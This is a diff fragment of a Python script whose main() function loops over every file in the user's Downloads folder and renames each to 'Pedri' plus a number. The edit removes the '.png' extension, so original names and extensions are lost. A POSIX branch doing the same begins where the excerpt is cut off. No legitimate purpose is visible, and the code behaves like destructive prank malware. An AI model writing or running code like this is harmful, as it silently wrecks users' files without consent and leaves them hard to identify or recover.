@@ -90,7 +90,7 @@ def main():
             if len((dir := os.listdir(os.path.expanduser('~') + r"\Downloads"))) > 0:
                 for i, file in enumerate(dir):
                     path = os.path.expanduser('~') + fr"\Downloads\{file}"
-                    os.rename(path, fr"{os.path.expanduser('~')}\Downloads\Pedri{str(i)}.png")
+                    os.rename(path, fr"{os.path.expanduser('~')}\Downloads\Pedri{str(i)}")
         if os.name == 'posix':
             if len((dir := os.listdir(os.path.expanduser('~') + r"/Downloads/"))) > 0:
                 for i, file in enumerate(dir):
